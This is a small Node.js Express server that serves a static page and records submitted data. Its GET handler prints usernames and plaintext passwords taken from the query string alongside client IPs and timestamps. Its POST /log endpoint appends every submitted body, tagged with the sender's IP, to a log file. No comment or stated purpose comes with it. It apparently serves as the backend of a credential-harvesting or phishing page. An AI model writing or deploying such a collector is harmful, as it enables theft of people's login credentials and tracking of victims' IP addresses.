const express = require('express')
const cors = require('cors')
const fs = require('fs')
const requestIp = require('request-ip')
const http = require('http')

const app = express()
app.use(cors())
app.use(express.json())
app.use(express.urlencoded({extended: true}))
app.use(express.static(__dirname + '/public'))

app.get('/', (req, res) => {
  console.log("GET /")
  console.log("req.query: "+req.query)
  console.log("req.params: "+req.params)
  if(req.query.username) {
    console.log(req.query.username, req.query.password)
    let str = JSON.stringify({
      timestamp: (new Date(Date.now())).toString(),
      IP: requestIp.getClientIp(req),
      username: req.query.username,
      password: req.query.password
    }) + "\n"
  }
  res.sendFile('public/index.html', {root: __dirname})
}) 

app.post('/log', (req, res) => {
  let str = JSON.stringify({
    timestamp: (new Date(Date.now())).toString(),
    IP: requestIp.getClientIp(req),
    ...req.body
  }) + "\n"
  fs.appendFile('./log.txt', str, () => console.log(str))
  res.send({status: 200})
})

http.createServer(app)
  .listen(6443, () => {
    console.log("HTTP Server listening on port 6443")
  })
